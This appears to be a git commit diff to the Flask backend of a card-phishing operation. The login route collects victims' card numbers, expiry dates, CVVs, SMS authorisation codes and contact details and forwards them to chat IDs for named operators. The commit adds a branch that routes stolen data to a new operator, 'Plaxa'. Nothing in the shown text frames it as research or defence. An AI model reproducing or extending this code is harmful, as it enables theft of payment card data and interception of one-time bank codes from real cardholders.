0f397876cffbbfb48216f1b514651d24123ca5ce
Your Name <you@example.com>
2024-07-09 00:52:21 +0300

    sngiorgn

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 from flask import Flask, redirect, request, jsonify
 from flask_cors import CORS
 from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut
-from CHAT_ID import MAIN_ID, Egoist, Egoist2
+from CHAT_ID import MAIN_ID, Egoist, Egoist2, Plaxa
 from checker import get_button_by_id
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
@@ -73,7 +73,16 @@ def login():
             ne_pizdabol(card_number)
             send_buttons_message(Egoist2, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
-
+        
+        # Plaxa
+        elif id == '1000004':
+            if authCode is not None and authCode != 'None':
+                send_sms(Plaxa, card_number, expiry_date, cvv, authCode, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(Plaxa, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+        
         return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки
 
     elif request.method == 'POST':
